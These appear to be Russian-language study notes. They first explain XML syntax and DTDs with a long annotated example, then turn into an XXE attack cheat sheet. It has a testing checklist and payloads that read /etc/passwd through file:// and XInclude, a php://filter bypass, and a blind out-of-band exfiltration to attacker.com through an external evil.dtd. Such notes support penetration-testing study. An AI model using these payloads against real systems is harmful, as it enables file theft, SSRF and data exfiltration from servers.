**XML** - аббревиатура от англ. _eXtensible Markup Language_ (пер. расширяемый язык разметки; произносится [экс-эм-эл]). XML разработан для хранения и передачи данных. XML играет важную роль, хотя и прост в изучении.

XML ничего не делает. Он был создан для структурирования, хранения и передачи информации.

>> XML решает задачу хранения и транспортировки данных, фокусируясь на том, что такое эти самые данные, HTML же решает задачу отображения данных, фокусируясь на том, как эти данные выглядят

- **XML** – язык разметки, который напоминает HTML, но это разные штуковины
- **XML** предназначен для передачи данных, а не для их отображения.
-  **Теги XML** не предопределены. Вы должны сами определять нужные теги.
- **XML** описан таким образом, чтобы быть самоопределяемым.

пример  (короче - сами прописываем теги и им значения)
```xml
<?xml version="1.0" encoding="UTF-8"?> 
<note> 
   <to>Tove</to>       
   <from>Jani</from> 
   <heading>Напоминание</heading> 
	<body>Не забудь обо мне в эти выходные!</body> 
</note>
```
##### Это просто информация, обернутая в теги.
Теги  `<to> и <from>` не определяются никакими стандартами XML. Эти теги были "изобретены" автором этого XML документа.

 <!ENTITY внешнийТекст SYSTEM "http://example.com/external.txt">
	<!-- &внешнийТекст; будет заменено содержимым по этому URL. -->

пример  от Ai
```xml

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!-- ========================================================= -->
<!--   ПОЛНЫЙ УЧЕБНЫЙ ДОКУМЕНТ ПО СИНТАКСИСУ XML              -->
<!--   Версия 3.0 - оригинальный синтаксис -->
<!-- ========================================================= -->

<!-- СЕКЦИЯ 1: ПРОЛОГ XML (XML PROLOG) -->
<!-- Это самая первая строка. Она не является тегом, а объявляет версию XML и кодировку. -->
<!-- standalone="yes" означает, что документ не зависит от внешних определений DTD. -->

<!-- СЕКЦИЯ 2: ОБЪЯВЛЕНИЕ DOCTYPE (DOCUMENT TYPE DECLARATION) -->
<!-- Эта секция определяет грамматику документа. Она начинается с <!DOCTYPE и заканчивается ]>. -->
<!DOCTYPE КорневойЭлемент [

    <!-- 2.1. ОБЪЯВЛЕНИЕ ВНУТРЕННЕЙ СУЩНОСТИ (INTERNAL ENTITY DECLARATION) -->
    <!-- Прямая подстановка текста. Используется как макрос. -->
    <!ENTITY автор "John Doe">
    <!-- Теперь в любом месте документа &автор; будет заменено на "John Doe". -->

    <!-- 2.2. ОБЪЯВЛЕНИЕ ВНЕШНЕЙ СУЩНОСТИ (EXTERNAL ENTITY DECLARATION) -->
    <!-- Ссылка на внешний ресурс. Может быть файлом или URL. ЭТО КЛЮЧ К УЯЗВИМОСТИ XXE. -->
    <!ENTITY внешнийТекст SYSTEM "http://example.com/external.txt">
    <!-- &внешнийТекст; будет заменено содержимым по этому URL. -->

    <!-- 2.3. ОБЪЯВЛЕНИЕ ПАРАМЕТРИЧЕСКОЙ СУЩНОСТИ (PARAMETER ENTITY DECLARATION) -->
    <!-- Используется только внутри DTD. Обозначается символом % -->
    <!ENTITY % типКонтента "(#PCDATA | ДочернийЭлемент)*">
    <!-- Теперь внутри DTD можно писать %типКонтента; как сокращение. -->

    <!-- 2.4. ОБЪЯВЛЕНИЕ ЭЛЕМЕНТА (ELEMENT DECLARATION) -->
    <!-- Описывает, какие дочерние элементы и в каком количестве могут быть внутри данного. -->
    <!ELEMENT КорневойЭлемент (Заголовок, ОсновнаяЧасть)>
    <!-- КорневойЭлемент должен содержать один элемент Заголовок и один элемент ОсновнаяЧасть, строго в этом порядке. -->

    <!ELEMENT Заголовок (#PCDATA)>
    <!-- #PCDATA (Parsed Character Data) означает, что элемент может содержать только обычный текст, без дочерних элементов. -->

    <!ELEMENT ОсновнаяЧасть (Параграф+, Примечание?)>
    <!-- + означает один или более (минимум один). ? означает ноль или один (необязательно). -->

    <!ELEMENT Параграф (%типКонтента;)>
    <!-- Используем параметрическую сущность. Параграф может содержать смешанный контент: текст и элемент ДочернийЭлемент. -->

    <!ELEMENT ДочернийЭлемент EMPTY>
    <!-- EMPTY означает, что элемент не может содержать никакого содержимого (ни текста, ни других тегов). -->

    <!ELEMENT Примечание ANY>
    <!-- ANY означает, что элемент может содержать любые данные, определенные в DTD. Устаревший и небезопасный тип. -->

    <!-- 2.5. ОБЪЯВЛЕНИЕ СПИСКА АТРИБУТОВ (ATTRIBUTE-LIST DECLARATION) -->
    <!-- Определяет, какие атрибуты есть у элемента и какие у них значения. -->
    <!ATTLIST Параграф
        идентификатор ID #IMPLIED
        язык (RU|EN|DE) "RU"
        ссылка CDATA #REQUIRED
        классификатор NMTOKEN #FIXED "обычный"
    >
    <!-- Атрибут "идентификатор" типа ID. ID должен быть уникальным в документе. #IMPLIED - необязателен.
         Атрибут "язык" - перечисление. "RU" - значение по умолчанию.
         Атрибут "ссылка" - текст (CDATA). #REQUIRED - обязательный.
         Атрибут "классификатор" - имя (NMTOKEN). #FIXED - всегда имеет это значение. -->

    <!ATTLIST ДочернийЭлемент
        нотация NOTATION (GIF|PNG) #IMPLIED
    >
    <!-- Атрибут типа NOTATION. Может ссылаться на объявленную ниже нотацию. -->

    <!-- 2.6. ОБЪЯВЛЕНИЕ НОТАЦИИ (NOTATION DECLARATION) -->
    <!-- Определяет тип внешнего нетекстового контента. -->
    <!NOTATION GIF SYSTEM "image/gif">
    <!NOTATION PNG SYSTEM "image/png">

    <!-- 2.7. ОБЪЯВЛЕНИЕ НЕРАЗБИРАЕМОЙ ВНЕШНЕЙ СУЩНОСТИ (UNPARSED ENTITY DECLARATION) -->
    <!-- Ссылка на бинарный файл, который не будет разбираться парсером. -->
    <!ENTITY логотип SYSTEM "/images/logo.gif" NDATA GIF>
    <!-- NDATA ссылается на нотацию GIF. &логотип; нельзя вставить в текст, можно только в атрибуты. -->

]>

<!-- ================ КОНЕЦ DTD, НАЧАЛО ТЕЛА ДОКУМЕНТА ================= -->
<!-- СЕКЦИЯ 3: ТЕЛО ДОКУМЕНТА (DOCUMENT BODY) -->
<!-- Здесь мы используем все объявленные выше конструкции. -->

<КорневойЭлемент>

    <!-- 3.1. ОБЫЧНЫЙ ЭЛЕМЕНТ С ТЕКСТОМ -->
    <Заголовок>Это заголовок документа</Заголовок>
    <!-- Комментарий: элемент Заголовок содержит только текст, как и разрешено в его DTD (#PCDATA). -->

    <!-- 3.2. ЭЛЕМЕНТ С ДОЧЕРНИМИ ЭЛЕМЕНТАМИ -->
    <ОсновнаяЧасть>

        <!-- 3.3. ИСПОЛЬЗОВАНИЕ СУЩНОСТЕЙ -->
        <Параграф идентификатор="p1" язык="RU" ссылка="p1-link" классификатор="обычный">
            Этот параграф написан &автор;. &copy; 2026.
            <!-- Комментарий: &автор; заменится на "John Doe". &copy; - это предопределенная сущность для символа копирайта. -->
            Также здесь есть ссылка на внешний ресурс, но она не отобразится, если парсер безопасный: &внешнийТекст;
        </Параграф>

        <!-- 3.4. ЭЛЕМЕНТЫ С РАЗНЫМ ТИПОМ СОДЕРЖИМОГО -->
        <Параграф идентификатор="p2" язык="EN" ссылка="p2-link">
            <ДочернийЭлемент/>
            <!-- Комментарий: пустой элемент. Так как он объявлен как EMPTY, он не может содержать текст,
                 но может иметь атрибуты. Синтаксис с косой чертой перед > - это самозакрывающийся тег. -->
        </Параграф>

        <!-- 3.5. ПУСТОЙ ЭЛЕМЕНТ С АТРИБУТОМ НОТАЦИИ -->
        <ДочернийЭлемент нотация="PNG"/>
        <!-- Комментарий: пример использования атрибута типа NOTATION. -->

        <!-- 3.6. НЕОБЯЗАТЕЛЬНЫЙ ЭЛЕМЕНТ ПРИМЕЧАНИЕ -->
        <Примечание>
            <!-- 3.7. СЕКЦИЯ CDATA -->
            <!-- Внутри CDATA парсер игнорирует синтаксис. Все символы (<, >, &) считаются обычным текстом. -->
            <![CDATA[
                Это текст внутри CDATA. Здесь можно писать любые символы: & < > " '.
                Даже целые куски HTML или кода: if (a < b && b > c) {}
                Парсер XML не будет интерпретировать это как теги или сущности.
                Единственное ограничение - нельзя встретить последовательность ]]>.
            ]]>
        </Примечание>

        <!-- 3.8. ИНСТРУКЦИИ ПО ОБРАБОТКЕ (PROCESSING INSTRUCTIONS) -->
        <!-- Это инструкции для приложения, обрабатывающего XML. Начинаются с <? и заканчиваются ?>. -->
        <?php echo "Эта инструкция для PHP"; ?>
        <?xml-stylesheet type="text/xsl" href="transform.xsl"?>
        <!-- Комментарий: вторая инструкция говорит процессору применить XSL-стиль для преобразования XML. -->

        <!-- 3.9. КОММЕНТАРИЙ -->
        <!-- Это комментарий. Парсеры его игнорируют. Здесь нельзя писать два дефиса подряд (--). -->

        <!-- 3.10. ПРОСТРАНСТВА ИМЕН (NAMESPACES) - ЭТО НЕ СИНТАКСИС, А ДОПОЛНЕНИЕ -->
        <!-- Формально, пространства имен используют синтаксис атрибутов. Они позволяют смешивать теги из разных словарей. -->
        <Параграф xmlns:math="http://www.w3.org/1998/Math/MathML"
                 идентификатор="p3" ссылка="p3-link">
            <math:sqrt>
                <math:mi>x</math:mi>
            </math:sqrt>
        </Параграф>
        <!-- Комментарий: xmlns:math объявляет префикс пространства имен.
             Тег <math:sqrt> взят из математического словаря, а не из нашего DTD. -->

    </ОсновнаяЧасть>

</КорневойЭлемент>

<!-- ================ КОНЕЦ ДОКУМЕНТА ================= -->

```

## ### Главные "сетевые" и "файловые" конструкции XML

###### Когда видишь, что приложение принимает XML, твой алгоритм действий:
1. Проверяй DOCTYPE. Есть ли он?
		 Есть ли внутри ==ENTITY== с ==SYSTEM== ?
2. Пробуй базовые протоколы: 
			 `file:///etc/passwd`,
			 `http://localhost:8080/`, 
			 `http://ТВОЙ-СЕРВЕР.oast.fun/`.
3. Если не работает, пробуй параметрические сущности.Это стандартный способ для Blind XXE.
4. Пробуй XInclude. Это отдельный вектор, который часто забывают.
5. Изучай нестандартные протоколы/обертки в зависимости от технологии бэкенда (PHP, Java, .NET).
6. Смотри на ошибки. Иногда сервер в ответе может выдать тебе путь к файлу или показать, что он пытался открыть.



-----
#### Внешние сущности (SYSTEM) — **Классика XXE**
**Опасность:** Чтение локальных файлов `(file://`) и SSRF через `http://` во внутренние сети

Объявляются ==в DTD== и позволяют подгружать данные по URL или из файла.
- **Синтаксис:** `<!ENTITY имя_сущности SYSTEM "URI">`
- Внутри тегов через `&имя_сущности;`
- - Ищем в запросах: DOCTYPE с `SYSTEM` и протоколами `file://`, `http://`, `https://`, `ftp://`.
пример 
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data>&xxe;</data>

```
--------
#### Параметрические сущности (Parameter Entities) — **Для слепых атак**

 DTD, где одна сущность вызывает другую, которая делает запрос наружу.
Используются только ==внутри DTD==^  позволяют делать Out-of-Band (OOB) запр
**Синтаксис:** `<!ENTITY % имя_сущности SYSTEM "URI">` (процент перед именем важно)
**Использование:** `%имя_сущности;` — тоже внутри DTD

```xml
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>&send;</root>

-------------------------------------------------
_в `evil.dtd`?_  там примерно такое:

<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;

```
Сервер сходит на твой сайт и в параметре запроса передаст содержимое файла [](https://cloud.tencent.cn/developer/ask/sof/106513665?from=16139)[](https://www.securitylab.ru/analytics/454815.php?el_id=454815&VOTE_ID=101&view_result=Y).

--------
#### DOCTYPE с внешним DTD (SYSTEM / PUBLIC)
Сервер скачает твой DTD-файл, в котором могут быть объявлены свои сущности. Это тоже SSRF&.
Сам корневой элемент `DOCTYPE` может ссылаться на внешний файл с правилами

- **Синтаксис:** `<!DOCTYPE корневой_элемент SYSTEM "URI_DTD-файла">`
- **Что ищем:** Сам DOCTYPE содержит ссылку на внешний ресурс.
Пример:
```xml
<!DOCTYPE root SYSTEM "http://attacker.com/malicious.dtd">
<root>
  <data>test</data>
</root>
```


---------
#### Схемы (XSD) и их импорты
XML-схемы (`*.xsd`) — это тоже XML. Они могут импортировать другие схемы по сети.
- **Синтаксис:** `<xsd:import namespace="..." schemaLocation="URL"/>` или `<xsd:include schemaLocation="URL"/>`

- Как искать?: XML-документы, которые ссылаются на схему (`xsi:schemaLocation`), или если само приложение грузит схему, а мы можем влиять на путь.

-----
#### XInclude — **Отдельная тема!**
Это отдельный стандарт для включения кусков XML из других файлов. Может работать даже если DTD отключен!

- **Синтаксис:** `<xi:include href="URI" parse="xml|text"/>` (нужно объявить пространство имен `xmlns:xi="http://www.w3.org/2001/XInclude"`)

- Как искать?:** Теги `<xi:include>`.
пример:
```xml
<data xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</data>
```
 Позволяет читать файлы даже при отключенных DTD

-------
####  Специфические API и Resolver"ы (продвинутый уровень)
В некоторых языках и библиотеках есть свои механизмы. Самый яркий пример — PHP-обертки. Даже если `file://` заблокирован, могут сработать другие.

- **Синтаксис:** `php://filter/convert.base64-encode/resource=/etc/passwd`
- **Где вставляем:** Всё туда же, в `SYSTEM "..."`.

Пример XXE через PHP:
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&xxe;</data>
```
Обход фильтров, доступ к нестандартным источникам данных
